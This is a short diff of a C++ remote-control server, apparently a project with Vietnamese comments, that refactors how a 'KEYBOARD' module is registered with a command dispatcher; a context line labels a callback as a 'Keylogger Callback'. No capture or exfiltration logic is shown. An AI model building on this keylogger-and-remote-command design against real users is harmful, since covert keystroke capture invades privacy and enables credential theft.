@@ -52,17 +52,8 @@ namespace http      = boost::beast::http;
 
 // ==================== GLOBALS ====================
 static std::mutex cout_mtx;
-KeyManager keyManager;
 CommandDispatcher g_dispatcher;
 
-// Adapter cho KeyManager
-class KeyManagerAdapter : public IRemoteModule {
-public:
-    const std::string& get_module_name() const override { 
-        static const std::string name = "KEYBOARD"; return name; 
-    }
-    json handle_command(const json& request) override { return keyManager.handle_command(request); }
-};
 
 // ==================== HELPER FUNCTIONS (Đa nền tảng) ====================
 
@@ -413,7 +404,7 @@ int main() {
 
     std::cout << "=== REMOTE SERVER [" << get_os_name() << "] ===\n";
 
-    g_dispatcher.register_module(std::make_unique<KeyManagerAdapter>());
+    g_dispatcher.register_module(std::make_unique<KeyManager>());
     
     // Keylogger Callback
     KeyManager::set_callback([&](std::string key_char) {
